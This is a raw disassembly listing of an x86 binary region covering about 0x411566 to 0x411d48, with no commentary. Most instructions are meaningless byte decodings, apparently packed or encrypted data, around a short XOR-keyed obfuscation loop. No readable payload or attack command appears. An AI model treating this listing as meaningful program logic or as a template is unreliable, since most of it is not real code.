  411566:	(bad)  
  411567:	jg     0x41150f
  411569:	push   ebp
  41156a:	inc    ebx
  41156b:	in     al,0xcf
  41156d:	outs   dx,BYTE PTR ds:[esi]
  41156e:	retf   
  41156f:	out    0x60,al
  411571:	add    BYTE PTR [ebx-0x3cdf3c52],dh
  411577:	jp     0x4115db
  411579:	mov    bh,0x47
  41157b:	push   edx
  41157c:	jns    0x411578
  41157e:	push   ds
  41157f:	inc    ecx
  411580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411581:	mov    esi,eax
  411583:	lea    edx,[edx]
  411585:	inc    ebx
  411586:	ss jbe 0x4115b7
  411589:	cld    
  41158a:	push   ebx
  41158b:	or     al,0x94
  41158d:	pop    esi
  41158e:	leave  
  41158f:	add    ecx,DWORD PTR [edi-0x62373870]
  411595:	or     eax,0xa341486a
  41159a:	xor    BYTE PTR [ecx-0x6be7ccd4],dh
  4115a0:	jge    0x4115e8
  4115a2:	dec    ecx
  4115a3:	sub    BYTE PTR [eax-0x25],dl
  4115a6:	and    BYTE PTR [ebp-0x7e565c88],ch
  4115ac:	xchg   BYTE PTR [edx+0x72],bh
  4115af:	out    dx,al
  4115b0:	and    al,0xac
  4115b2:	js     0x411590
  4115b4:	sub    DWORD PTR [edx-0x568547ad],0x948734c9
  4115be:	sahf   
  4115bf:	cmc    
  4115c0:	(bad)  
  4115c1:	iret   
  4115c2:	push   esi
  4115c3:	repz repz inc ebx
  4115c6:	stos   BYTE PTR es:[edi],al
  4115c7:	lea    esp,ds:0x7d3b40af
  4115cd:	jae    0x4115ab
  4115cf:	aas    
  4115d0:	hlt    
  4115d1:	adc    DWORD PTR ds:0x69a1595d,0xce5824a1
  4115db:	pop    ds
  4115dc:	cli    
  4115dd:	inc    eax
  4115de:	xor    DWORD PTR [ebx+0x49],0xe10e603
  4115e5:	jb     0x4115ff
  4115e7:	fadd   st,st(0)
  4115e9:	xchg   ebx,eax
  4115ea:	mov    esi,0x11569bdb
  4115ef:	inc    esp
  4115f0:	inc    eax
  4115f1:	pop    edx
  4115f2:	fwait
  4115f3:	pop    DWORD PTR [ebp*1-0x2be31838]
  4115fa:	call   0x60fa:0xd64b56ae
  411601:	mov    ds:0x2e5fff6,eax
  411606:	enter  0x70d4,0xc4
  41160a:	fstp   TBYTE PTR [esi+ecx*1-0x44]
  41160f:	xchg   esp,eax
  411610:	pop    es
  411611:	inc    eax
  411612:	repz push ecx
  411614:	fadd   DWORD PTR [ecx+0x47]
  411617:	stc    
  411618:	mov    eax,ds:0x1148a90
  41161d:	cdq    
  41161e:	int    0x4c
  411620:	(bad)  
  411621:	dec    esp
  411622:	sbb    eax,DWORD PTR [eax-0x70eee031]
  411628:	scas   eax,DWORD PTR es:[edi]
  411629:	and    DWORD PTR [esp+ebp*1],esp
  41162c:	jns    0x41168d
  41162e:	pop    ebx
  41162f:	sub    ecx,DWORD PTR [ebx+0x3]
  411632:	enter  0x4c1f,0x20
  411636:	xlat   BYTE PTR ds:[ebx]
  411637:	ret    
  411638:	fnstcw WORD PTR [edx+0x1c7354e8]
  41163e:	sar    BYTE PTR [edx],1
  411640:	pop    ds
  411641:	cmp    DWORD PTR ds:0x436b3a68,0xf67ea72f
  41164b:	xor    al,dl
  41164d:	stos   BYTE PTR es:[edi],al
  41164e:	xchg   edx,eax
  41164f:	jb     0x4116c6
  411651:	jb     0x41165a
  411653:	imul   ebp,DWORD PTR [esi],0x3b74fa64
  411659:	mov    eax,DWORD PTR [edx-0x5f]
  41165c:	xlat   BYTE PTR ds:[ebx]
  41165d:	scas   al,BYTE PTR es:[edi]
  41165e:	or     bh,BYTE PTR [ebp+0x66a58884]
  411664:	xchg   BYTE PTR [edx],cl
  411666:	pop    ss
  411667:	mov    dh,BYTE PTR [edx]
  411669:	xchg   ebx,eax
  41166a:	inc    esi
  41166b:	push   esi
  41166c:	mov    esp,0xd28f23cc
  411671:	inc    edi
  411672:	(bad)  
  411673:	fstp   DWORD PTR [ebx+0x70]
  411676:	push   cs
  411677:	inc    ecx
  411678:	xchg   esp,eax
  411679:	out    0x16,al
  41167b:	lods   eax,DWORD PTR ds:[esi]
  41167c:	mov    eax,?
  41167e:	scas   eax,DWORD PTR es:[edi]
  41167f:	cdq    
  411680:	adc    eax,0x904aeb81
  411685:	push   edx
  411686:	pop    esi
  411687:	(bad)  
  411688:	ficom  WORD PTR [edi-0x75fdb2cb]
  41168e:	inc    edx
  41168f:	fadd   QWORD PTR [ebp+0x22]
  411692:	(bad)  
  411693:	xchg   ebp,eax
  411694:	xchg   edi,eax
  411695:	or     BYTE PTR [esi+eax*4],0xb2
  411699:	repz push ebp
  41169b:	adc    al,0xbd
  41169d:	cmc    
  41169e:	lds    ebx,FWORD PTR [edx+0x65d04fc1]
  4116a4:	fiadd  DWORD PTR [eax-0x670f5974]
  4116ab:	outs   dx,BYTE PTR ds:[esi]
  4116ac:	inc    eax
  4116ad:	and    al,0xc4
  4116af:	push   ecx
  4116b0:	pop    ds
  4116b1:	sub    DWORD PTR [ecx],esp
  4116b3:	jno    0x411639
  4116b5:	xchg   esi,eax
  4116b6:	mov    ds:0xfd580565,eax
  4116bb:	fld    QWORD PTR ds:0xea362ac4
  4116c1:	push   es
  4116c2:	mov    DWORD PTR [eax-0x60],edx
  4116c5:	and    BYTE PTR [ebx+0x64a852ba],0x7d
  4116cc:	sbb    bh,BYTE PTR [edx-0x22e1141f]
  4116d2:	enter  0x2182,0x72
  4116d6:	fstp   TBYTE PTR [ebx-0x31]
  4116d9:	out    0xcc,al
  4116db:	mov    edi,?
  4116dd:	jb     0x411729
  4116df:	repz mov ebx,0x6001c149
  4116e5:	xchg   ebp,eax
  4116e6:	jne    0x4116e1
  4116e8:	clc    
  4116e9:	cli    
  4116ea:	push   eax
  4116eb:	sahf   
  4116ec:	scas   eax,DWORD PTR es:[edi]
  4116ed:	ins    DWORD PTR es:[edi],dx
  4116ee:	mov    bl,0xb6
  4116f0:	and    al,0x74
  4116f2:	fiadd  DWORD PTR [ecx+0x5af43bac]
  4116f8:	mov    eax,ds:0xd6e8d54f
  4116fd:	arpl   WORD PTR [ebx-0x2a],bp
  411700:	pushf  
  411701:	repnz mov edx,0xe20efd8a
  411707:	je     0x411771
  411709:	dec    edi
  41170a:	mov    WORD PTR [ebp+ebx*2-0x7c],es
  41170e:	mov    ebp,0xfef48284
  411713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411714:	(bad)  
  411716:	or     edx,DWORD PTR [esi-0x42]
  411719:	mov    al,0x0
  41171b:	ja     0x411709
  41171d:	fwait
  41171e:	xor    ebp,DWORD PTR [edx+0x26]
  411721:	push   0xfffffffd
  411723:	xor    BYTE PTR [ebx+ecx*4+0x45],dl
  411727:	pop    esp
  411728:	push   es
  411729:	ret    0x30b
  41172c:	mov    eax,ds:0x10c172fe
  411731:	aam    0x2a
  411733:	add    DWORD PTR [eax+ebp*8-0x7db2cd4f],esi
  41173a:	clc    
  41173b:	jl     0x411738
  41173d:	jecxz  0x411759
  41173f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411740:	cmp    esi,edi
  411742:	pop    ebp
  411743:	(bad)  
  411744:	stos   DWORD PTR es:[edi],eax
  411745:	mov    ch,0x69
  411747:	inc    ebp
  411748:	jmp    0x6cd3f3bf
  41174d:	adc    DWORD PTR [esi],esi
  41174f:	retf   
  411750:	or     al,0x8d
  411752:	ins    DWORD PTR es:[edi],dx
  411753:	es loop 0x4116e2
  411756:	pop    ebp
  411757:	sub    eax,0x23d32733
  41175c:	mov    dl,0x75
  41175e:	xchg   BYTE PTR [esi+eiz*1],bl
  411761:	lods   al,BYTE PTR ds:[esi]
  411762:	int3   
  411763:	xchg   edx,eax
  411764:	adc    al,0xcc
  411766:	shr    BYTE PTR [ecx+0x68],1
  411769:	fild   DWORD PTR [edi+eiz*4-0x4b]
  41176d:	shl    ebx,0x1e
  411770:	ins    DWORD PTR es:[edi],dx
  411771:	repnz outs dx,BYTE PTR ds:[esi]
  411773:	push   ds
  411774:	xchg   esp,eax
  411775:	popf   
  411776:	idiv   BYTE PTR [edi+0x61928b61]
  41177c:	arpl   WORD PTR [edi+edx*4],ax
  41177f:	inc    esi
  411780:	scas   eax,DWORD PTR es:[edi]
  411781:	out    dx,al
  411782:	cmp    edx,0xffffffd9
  411785:	fld    st(4)
  411787:	xchg   DWORD PTR [edx+0x244b1d43],edi
  41178d:	repnz fld QWORD PTR [ebx-0x5993983]
  411794:	sbb    DWORD PTR [eax+0x60],0x3627711c
  41179b:	test   eax,0xa4d309e0
  4117a0:	sub    ch,BYTE PTR [esi-0x6d]
  4117a3:	and    eax,0xe7bd93e2
  4117a8:	retf   
  4117a9:	and    eax,0x6e56a6df
  4117ae:	mov    edi,0x31d9f0a9
  4117b3:	pop    edx
  4117b4:	mov    fs,WORD PTR [esp+esi*4]
  4117b7:	ins    DWORD PTR es:[edi],dx
  4117b8:	dec    ebx
  4117b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117ba:	add    BYTE PTR [esi+edi*4],dh
  4117bd:	loop   0x4117ec
  4117bf:	outs   dx,DWORD PTR ds:[esi]
  4117c0:	push   edx
  4117c1:	mov    WORD PTR [eax+0x2881fbef],es
  4117c7:	outs   dx,BYTE PTR ds:[esi]
  4117c8:	jmp    0x78d0911c
  4117cd:	inc    edi
  4117ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117cf:	gs push 0xcab5497d
  4117d5:	into   
  4117d6:	ret    0x75c1
  4117d9:	xchg   ebp,eax
  4117da:	stc    
  4117db:	xor    ebp,esp
  4117dd:	(bad)  
  4117de:	sub    BYTE PTR [ecx],bh
  4117e0:	adc    eax,0x7331b926
  4117e5:	add    BYTE PTR [ecx+ebx*4+0x6a81ee68],bl
  4117ec:	xchg   esi,eax
  4117ed:	out    0x2b,eax
  4117ef:	into   
  4117f0:	xor    ecx,eax
  4117f2:	mov    DWORD PTR [ebp+0x8],ecx
  4117f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4117f8:	mov    edx,DWORD PTR [ebp+0x8]
  4117fb:	imul   edx,edx,0x5708f1
  411801:	xor    ecx,eax
  411803:	add    ecx,esi
  411805:	lea    ecx,[ebp+ecx*4-0x64]
  411809:	mov    edi,DWORD PTR [ecx]
  41180b:	add    edx,edi
  41180d:	mov    DWORD PTR [ecx],edx
  41180f:	mov    ecx,DWORD PTR [ebp+0x8]
  411812:	xor    ecx,eax
  411814:	add    ecx,esi
  411816:	jne    0x40f45a
  41181c:	jmp    0x413bef
  411821:	mov    ecx,DWORD PTR [ebp+0x8]
  411824:	mov    edx,DWORD PTR [ebp-0x8]
  411827:	xor    ecx,eax
  411829:	xor    edx,eax
  41182b:	sub    ecx,edx
  41182d:	sub    ecx,esi
  41182f:	xor    ecx,eax
  411831:	mov    DWORD PTR [ebp+0x8],ecx
  411834:	mov    ecx,DWORD PTR [ebp+0x8]
  411837:	mov    edx,DWORD PTR [ebp+0x8]
  41183a:	xor    ecx,eax
  41183c:	imul   edx,edx,0x5708f1
  411842:	add    ecx,esi
  411844:	lea    ecx,[ebp+ecx*4-0x64]
  411848:	mov    edi,DWORD PTR [ecx]
  41184a:	add    edx,edi
  41184c:	mov    DWORD PTR [ecx],edx
  41184e:	mov    ecx,DWORD PTR [ebp+0x8]
  411851:	xor    ecx,eax
  411853:	add    ecx,esi
  411855:	jne    0x411821
  41185b:	jmp    0x413be3
  411860:	ins    BYTE PTR es:[edi],dx
  411861:	jns    0x4117f2
  411863:	sbb    edi,DWORD PTR [ebx+0x1b]
  411866:	mov    eax,0xa6df667b
  41186b:	push   edi
  41186c:	fidivr DWORD PTR [edi-0x6f17af4e]
  411872:	jl     0x4118f0
  411874:	pop    es
  411875:	pop    edi
  411876:	jl     0x4118f4
  411878:	stos   BYTE PTR es:[edi],al
  411879:	xor    eax,0x90b01e53
  41187e:	cmp    al,0x82
  411880:	stos   BYTE PTR es:[edi],al
  411881:	clc    
  411882:	jne    0x411806
  411884:	cwde   
  411885:	retf   
  411886:	test   BYTE PTR [eax+0x28],0x72
  41188a:	fs pop edx
  41188c:	push   0x75
  41188e:	fld    QWORD PTR [edx+0x5dc4fcad]
  411894:	scas   al,BYTE PTR es:[edi]
  411895:	jmp    0x411848
  411897:	fiadd  WORD PTR [edi+0x2c2bb9f1]
  41189d:	inc    eax
  41189e:	add    al,0x1
  4118a0:	pop    esi
  4118a1:	sti    
  4118a2:	(bad)  
  4118a4:	fistp  WORD PTR [eax-0x5a]
  4118a7:	mov    ecx,?
  4118a9:	lods   eax,DWORD PTR ds:[esi]
  4118aa:	mov    edi,0x3832f86b
  4118af:	ins    BYTE PTR es:[edi],dx
  4118b0:	push   es
  4118b1:	pushf  
  4118b2:	mov    ch,0xdb
  4118b4:	test   BYTE PTR [esi],bl
  4118b6:	out    dx,eax
  4118b7:	stc    
  4118b8:	pop    ds
  4118b9:	call   0x470f:0xa0a166d
  4118c0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4118c2:	jne    0x4118c2
  4118c4:	and    cl,BYTE PTR [eax]
  4118c6:	test   DWORD PTR [ebx-0x5c3ca7b1],0x25849c27
  4118d0:	std    
  4118d1:	fldenv [esi+0x27]
  4118d4:	jno    0x411901
  4118d6:	in     eax,0xdc
  4118d8:	imul   ecx,DWORD PTR [ebp-0x6],0xffffff95
  4118dc:	loop   0x411897
  4118de:	mov    cl,0x74
  4118e0:	sub    ah,BYTE PTR [ebp-0x6]
  4118e3:	pop    ss
  4118e4:	enter  0x908,0x3d
  4118e8:	add    eax,0x2ea7d8c4
  4118ed:	xor    ah,BYTE PTR [edx+ebx*8+0x1c59c58f]
  4118f4:	cmp    al,0xf9
  4118f6:	sbb    esi,DWORD PTR [ebx-0x6a]
  4118f9:	xor    al,0xe
  4118fb:	ficom  DWORD PTR ds:0x510c9578
  411901:	not    BYTE PTR ds:0x495404a3
  411907:	jb     0x4118c8
  411909:	loopne 0x411974
  41190b:	mov    dl,0x9a
  41190d:	ror    BYTE PTR [edi+ebx*1],0x2c
  411911:	(bad)  
  411912:	in     eax,0x46
  411914:	cmp    eax,0xa3b90fbe
  411919:	cmp    BYTE PTR [esi+0x63],0x72
  41191d:	inc    ebx
  41191e:	int3   
  41191f:	ss out 0x21,al
  411922:	inc    esi
  411923:	push   0x6c
  411925:	jns    0x4118dd
  411927:	jnp    0x411903
  411929:	loop   0x4118e8
  41192b:	mov    esi,0xfd590af7
  411930:	stos   BYTE PTR es:[edi],al
  411931:	dec    edx
  411932:	push   es
  411933:	mov    eax,0xd0e6aa03
  411938:	cwde   
  411939:	mov    WORD PTR [esi-0x3fceb47c],?
  41193f:	push   DWORD PTR [eax]
  411941:	and    eax,0x5413d928
  411946:	add    DWORD PTR [ecx+0x5c982106],0x206c7ca1
  411950:	scas   al,BYTE PTR es:[edi]
  411951:	sahf   
  411952:	xchg   ebp,eax
  411953:	dec    edx
  411954:	fisub  DWORD PTR [ecx]
  411956:	arpl   WORD PTR [edi],bp
  411958:	in     al,dx
  411959:	rol    BYTE PTR [eax],1
  41195b:	int    0x45
  41195d:	shl    ecx,1
  41195f:	idiv   ebx
  411961:	leave  
  411962:	mov    ecx,0x7cbfaf46
  411967:	or     ch,BYTE PTR [edx]
  411969:	aad    0x2
  41196b:	imul   esp,esi,0xffffffd6
  41196e:	xor    esp,esp
  411970:	iret   
  411971:	cmp    bh,cl
  411973:	test   DWORD PTR gs:[edi+0x3d5c04fd],esp
  41197a:	aaa    
  41197b:	cmp    eax,0xf348d36d
  411980:	fisub  DWORD PTR [ecx]
  411982:	sbb    ecx,0x16
  411985:	push   edx
  411986:	fwait
  411987:	rcl    DWORD PTR [ebp-0x8571d75],1
  41198d:	inc    edx
  41198e:	pop    ecx
  41198f:	ret    
  411990:	scas   al,BYTE PTR es:[edi]
  411991:	call   0xe83a:0xc700c9c5
  411998:	push   edx
  411999:	test   BYTE PTR [edi+0x2674a0fa],dh
  41199f:	mov    al,ds:0x6a015873
  4119a4:	stos   BYTE PTR es:[edi],al
  4119a5:	leave  
  4119a6:	mov    edi,0xb3af2cbc
  4119ab:	jge    0x41193b
  4119ad:	push   ss
  4119ae:	jmp    0x402b:0xa69b2d37
  4119b5:	pop    edx
  4119b6:	je     0x411a1a
  4119b8:	stos   DWORD PTR es:[edi],eax
  4119b9:	and    BYTE PTR [edi],ah
  4119bb:	xchg   BYTE PTR [ebp+0x3465d82a],cl
  4119c1:	dec    eax
  4119c2:	retf   
  4119c3:	rol    BYTE PTR [ebp-0x293b9036],1
  4119c9:	ror    BYTE PTR [ecx-0x2ae7e8af],1
  4119cf:	mov    esp,ds
  4119d1:	inc    esi
  4119d2:	adc    eax,0x5cd90d03
  4119d7:	das    
  4119d8:	jge    0x4119fd
  4119da:	sete   cl
  4119dd:	popf   
  4119de:	inc    edx
  4119df:	fidivr DWORD PTR [edi-0x400cb53e]
  4119e5:	push   esi
  4119e6:	or     eax,0x82449b60
  4119eb:	and    eax,0x1686cc28
  4119f1:	jge    0x4119bf
  4119f3:	add    DWORD PTR [ebx+ebx*2-0x6d430a41],ecx
  4119fa:	fidivr DWORD PTR [edx+ebp*8+0x52]
  4119fe:	mov    esi,0xe9c28933
  411a03:	ja     0x411a62
  411a05:	pusha  
  411a06:	jne    0x411a22
  411a08:	das    
  411a09:	pop    ds
  411a0a:	addr16 sub dl,al
  411a0d:	dec    ebx
  411a0e:	xchg   ebp,eax
  411a0f:	fnsave [edi-0x31]
  411a12:	test   eax,0x7bb16d6f
  411a17:	mov    ds,WORD PTR [esi-0x2c9f7ad9]
  411a1d:	(bad)
  411a20:	xor    BYTE PTR [eax+0x6d29c65],ah
  411a26:	femms  
  411a28:	in     al,dx
  411a29:	mov    dh,BYTE PTR [ebp-0x67]
  411a2c:	and    al,0x2b
  411a2e:	dec    edi
  411a2f:	ret    
  411a30:	push   cs
  411a31:	xor    DWORD PTR [ebx],esi
  411a33:	out    dx,al
  411a34:	push   ecx
  411a35:	mov    esi,0x5f7a6c45
  411a3a:	xor    dl,bh
  411a3c:	(bad)  
  411a3d:	repnz clc 
  411a3f:	dec    edi
  411a40:	adc    ebx,DWORD PTR [ebx+0x3d]
  411a43:	jns    0x411a97
  411a45:	aaa    
  411a46:	fstp   st(3)
  411a48:	push   ebx
  411a49:	int    0x45
  411a4b:	ja     0x411a9c
  411a4d:	jns    0x411a56
  411a4f:	mov    ah,0x89
  411a51:	lea    esi,[ebx]
  411a53:	and    DWORD PTR [eax-0x34],ecx
  411a56:	adc    ebp,eax
  411a58:	cdq    
  411a59:	test   ah,ch
  411a5b:	pushf  
  411a5c:	dec    esp
  411a5d:	add    BYTE PTR [ebx-0x13],al
  411a60:	shr    al,cl
  411a62:	inc    esp
  411a63:	pop    ebx
  411a64:	push   ecx
  411a65:	fcom   QWORD PTR [edi-0x6c]
  411a68:	mov    cl,0x5b
  411a6a:	(bad)  
  411a6b:	or     DWORD PTR [ebp+edx*8+0x19],ecx
  411a6f:	sbb    al,0xae
  411a71:	jle    0x411aa0
  411a73:	lods   al,BYTE PTR ds:[esi]
  411a74:	sbb    bh,BYTE PTR [ebp-0x301218ec]
  411a7a:	ret    
  411a7b:	and    DWORD PTR [eax-0x6a],ecx
  411a7e:	cmp    eax,0x8bb7d978
  411a83:	cdq    
  411a84:	xchg   ecx,eax
  411a85:	test   eax,0x80354ccd
  411a8a:	sub    eax,0x4779e91c
  411a8f:	mov    ds:0x75f51832,al
  411a94:	enter  0xc633,0x90
  411a98:	pop    ds
  411a99:	fsubr  QWORD PTR [esi+0x271216ea]
  411a9f:	jbe    0x411a4b
  411aa1:	imul   ebp,DWORD PTR ds:0xa2855b67,0xb5a5409d
  411aab:	cmp    eax,0xec24007c
  411ab0:	loop   0x411a5c
  411ab2:	jae    0x411a34
  411ab4:	and    BYTE PTR [ebp+0x3843e4af],cl
  411aba:	dec    ebx
  411abb:	pusha  
  411abc:	mov    eax,ds:0x6c64cfff
  411ac1:	popa   
  411ac2:	shl    bh,cl
  411ac4:	jnp    0x411aad
  411ac6:	mov    cl,0xf9
  411ac8:	cs (bad) 
  411acb:	and    DWORD PTR [edi+0xfe81c6],0xffffffe0
  411ad2:	sbb    cl,dh
  411ad4:	scas   al,BYTE PTR es:[edi]
  411ad5:	jle    0x411b2c
  411ad7:	rcl    DWORD PTR [eax+eiz*1],0xde
  411adb:	mov    cl,0xee
  411add:	out    dx,al
  411ade:	adc    al,0x9c
  411ae0:	fwait
  411ae1:	cmp    eax,0x623946b5
  411ae6:	das    
  411ae7:	mov    cl,0x7
  411ae9:	stos   BYTE PTR es:[edi],al
  411aea:	mov    esp,0x2f90a4d0
  411aef:	push   ecx
  411af0:	out    dx,eax
  411af1:	mov    eax,0xbd4a9970
  411af6:	adc    edx,esp
  411af8:	xchg   esi,eax
  411af9:	inc    ecx
  411afa:	jmp    0x2ff1:0xc8a18601
  411b01:	test   BYTE PTR [ecx],bh
  411b03:	aam    0xdc
  411b05:	rol    bl,cl
  411b07:	pop    edi
  411b08:	cs dec ax
  411b0b:	mov    ebx,0x91b2dc5d
  411b10:	xchg   edi,eax
  411b11:	shl    ch,cl
  411b13:	push   0xffffffec
  411b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b16:	shl    BYTE PTR [edx+0x1c],cl
  411b19:	mov    BYTE PTR [edi-0x5c],al
  411b1c:	jmp    0x4c66:0x495b4725
  411b23:	cmp    di,WORD PTR [edx-0x21cf7a52]
  411b2a:	mov    ebx,0xf39cb4ae
  411b2f:	in     al,0xe5
  411b31:	and    eax,0xb94bf8aa
  411b36:	xchg   BYTE PTR [ebx-0x1b],cl
  411b39:	lds    eax,FWORD PTR [esp+ebp*4-0x5d]
  411b3d:	sti    
  411b3e:	fidivr WORD PTR [edx]
  411b40:	jle    0x411acd
  411b42:	ds xchg ebp,eax
  411b44:	cmp    DWORD PTR [eax+0x44],ecx
  411b47:	add    eax,0x368934dd
  411b4c:	or     al,0x5
  411b4e:	jl     0x411b5d
  411b50:	nop
  411b51:	dec    ebp
  411b52:	stc    
  411b53:	and    BYTE PTR [esi],ch
  411b55:	and    DWORD PTR [edx-0x7a],0x3a
  411b59:	push   ebp
  411b5a:	gs pop ds
  411b5c:	pop    edi
  411b5d:	pcmpeqd mm0,QWORD PTR es:[ebx+0x50]
  411b62:	ds inc esp
  411b64:	add    al,0x98
  411b66:	cwde   
  411b67:	push   ebx
  411b68:	xor    eax,0xce27c55
  411b6d:	jl     0x411b93
  411b6f:	out    dx,eax
  411b70:	add    eax,DWORD PTR [eax]
  411b72:	add    edi,DWORD PTR [esi]
  411b74:	adc    al,0x2b
  411b76:	scas   al,BYTE PTR es:[edi]
  411b77:	ror    DWORD PTR [ebx],0xd7
  411b7a:	or     DWORD PTR [edi-0xc],ebx
  411b7d:	inc    esi
  411b7e:	fcomp  DWORD PTR [ecx+0x22]
  411b81:	ins    BYTE PTR es:[edi],dx
  411b82:	sbb    BYTE PTR [ecx-0x1],al
  411b85:	sub    DWORD PTR [edi-0x50],0xe53ede9e
  411b8c:	sbb    bh,BYTE PTR [ebp-0x22e43674]
  411b92:	push   esp
  411b93:	jne    0x411bad
  411b95:	mov    edi,0x4f3b3b2c
  411b9a:	mov    esp,0x10ac99f3
  411b9f:	or     ecx,ebp
  411ba1:	add    al,0x12
  411ba3:	enter  0x6750,0x3d
  411ba7:	push   0xffffffe3
  411ba9:	or     eax,0xaa9c6a25
  411bae:	push   ebx
  411baf:	cdq    
  411bb0:	imul   ecx,esp,0xc5676c5
  411bb6:	xor    DWORD PTR [ebx*2-0x4740703],ebx
  411bbd:	aaa    
  411bbe:	lahf   
  411bbf:	inc    eax
  411bc0:	pause  
  411bc2:	aas    
  411bc3:	xchg   esi,eax
  411bc4:	mov    BYTE PTR [ecx+0x4dbe12aa],dl
  411bca:	cmp    ah,BYTE PTR [esp+edi*1-0x6b9831fb]
  411bd1:	mov    ecx,0xd5287a59
  411bd6:	lea    edi,[ebp+ecx*4-0x212265a8]
  411bdd:	xchg   BYTE PTR [ebx+0x63],bh
  411be0:	and    ah,BYTE PTR [eax+0x1adc462]
  411be6:	neg    ch
  411be8:	fstp   DWORD PTR [esi-0x71]
  411beb:	lods   al,BYTE PTR ds:[esi]
  411bec:	ror    DWORD PTR [esi-0x4af70b6e],cl
  411bf2:	cmp    bh,BYTE PTR [edi]
  411bf4:	out    0x70,eax
  411bf6:	inc    ebx
  411bf7:	jp     0x411c09
  411bf9:	and    BYTE PTR [ecx+ebx*1],dh
  411bfc:	call   0xcca:0xbf9a862a
  411c03:	lods   eax,DWORD PTR ds:[esi]
  411c04:	ret    
  411c05:	mov    ch,0xf6
  411c07:	mov    al,0xbc
  411c09:	mov    ecx,0x6a4583db
  411c0e:	out    0x85,al
  411c10:	mov    esp,0xe292a706
  411c15:	lfs    esp,FWORD PTR [edx]
  411c18:	(bad)  
  411c1a:	push   ecx
  411c1b:	fdivr  DWORD PTR [edx-0x24]
  411c1e:	lods   al,BYTE PTR ds:[esi]
  411c1f:	dec    ebp
  411c20:	pop    ss
  411c21:	ror    eax,cl
  411c23:	and    bh,dh
  411c25:	pop    ss
  411c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c27:	cmp    eax,0x347ef608
  411c2c:	rcl    DWORD PTR [ecx+eiz*8],cl
  411c2f:	(bad)  [esi]
  411c31:	ficom  DWORD PTR [ecx]
  411c33:	pop    ds
  411c34:	sub    al,0x2a
  411c36:	int    0x67
  411c38:	push   0x88590908
  411c3d:	outs   dx,DWORD PTR ds:[esi]
  411c3e:	(bad)  [esi+0x48]
  411c41:	(bad)  
  411c42:	adc    al,0xc4
  411c44:	les    esp,FWORD PTR [edi-0x7869d3a4]
  411c4a:	cld    
  411c4b:	iret   
  411c4c:	ret    
  411c4d:	xchg   ebx,eax
  411c4e:	add    esp,DWORD PTR [edi-0x1c3f9439]
  411c54:	add    al,0x80
  411c56:	cmp    ah,BYTE PTR [ecx+0x24366e72]
  411c5c:	jno    0x411bde
  411c5e:	ds retf 
  411c60:	push   ebp
  411c61:	mov    ds:0x35cf08d6,al
  411c66:	test   BYTE PTR [edx-0x11],bh
  411c69:	test   edx,0x4ed7a1a8
  411c6f:	rcl    DWORD PTR ss:[edi+0x5d3b3f8a],cl
  411c76:	xchg   esp,eax
  411c77:	ss mov bl,0xd8
  411c7a:	adc    esp,esp
  411c7c:	ret    0x144
  411c7f:	mov    ds:0x442e9d64,al
  411c84:	push   esi
  411c85:	mov    eax,ds:0x818af202
  411c8a:	adc    edx,0xffffffb2
  411c8d:	add    bl,BYTE PTR [eax+0x4e1558c3]
  411c93:	repz imul eax,eax,0x28
  411c97:	test   cl,bh
  411c99:	iret   
  411c9a:	int    0x36
  411c9c:	jae    0x411cf2
  411c9e:	(bad)  
  411c9f:	dec    BYTE PTR [eax+ecx*2-0x7b]
  411ca3:	mov    esi,0x12d84995
  411ca8:	inc    esp
  411ca9:	outs   dx,DWORD PTR ds:[esi]
  411caa:	push   ebp
  411cab:	dec    ebp
  411cac:	popw   ds
  411cae:	mov    ch,0xe7
  411cb0:	sub    DWORD PTR [esp+edi*2],0xffffffa3
  411cb4:	mov    ah,0x7f
  411cb6:	add    al,0xa2
  411cb8:	int3   
  411cb9:	or     BYTE PTR [esi-0xa],0x8a
  411cbd:	inc    ebx
  411cbe:	sbb    edi,DWORD PTR [ebp+0x6d8ad3b9]
  411cc4:	jle    0x411c8c
  411cc6:	mov    ds:0xfd85b19d,eax
  411ccb:	pop    edx
  411ccc:	xor    ecx,DWORD PTR [eax]
  411cce:	call   FWORD PTR [edx]
  411cd0:	sub    eax,0x6c10b117
  411cd5:	lahf   
  411cd6:	lds    esp,FWORD PTR [eax+ebp*4]
  411cd9:	mov    bh,ch
  411cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cdc:	push   edx
  411cdd:	or     esp,edi
  411cdf:	fs xor eax,0x821b5467
  411ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ce6:	jl     0x411d47
  411ce8:	inc    ebx
  411ce9:	rcl    DWORD PTR [eax-0x74],1
  411cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ced:	fidiv  WORD PTR [ecx]
  411cef:	lods   al,BYTE PTR ds:[esi]
  411cf0:	repnz fwait
  411cf2:	xchg   sp,ax
  411cf4:	and    ebx,ecx
  411cf6:	inc    esi
  411cf7:	add    al,0x33
  411cf9:	push   0x6e
  411cfb:	fcom   QWORD PTR [ecx+0x32]
  411cfe:	jb     0x411d00
  411d00:	sbb    DWORD PTR [esi+0x5b6c7093],0xffffffb7
  411d07:	(bad)  
  411d08:	pop    esp
  411d09:	pop    ecx
  411d0a:	fidivr WORD PTR [eax+0x2b]
  411d0d:	out    dx,al
  411d0e:	mov    ecx,0xd4373eae
  411d13:	mov    ebx,0x44d9073b
  411d18:	mov    ss,WORD PTR [ecx+0x16952f4e]
  411d1e:	inc    BYTE PTR [eax+0x2e]
  411d21:	ret    
  411d22:	cmp    edi,DWORD PTR [edi+esi*1+0x56]
  411d26:	pusha  
  411d27:	out    dx,al
  411d28:	xor    bl,bl
  411d2a:	stc    
  411d2b:	sub    al,0xa9
  411d2d:	fadd   st(7),st
  411d2f:	scas   al,BYTE PTR es:[edi]
  411d30:	push   ebx
  411d31:	sbb    dl,BYTE PTR [edi-0x47]
  411d34:	xor    DWORD PTR fs:[esi-0x2f81ac13],ecx
  411d3b:	pop    eax
  411d3c:	pushf  
  411d3d:	mov    ds:0xd7c19d06,eax
  411d42:	mov    edx,0x2089b365
  411d47:	pop    ds
  411d48:	pop    edi
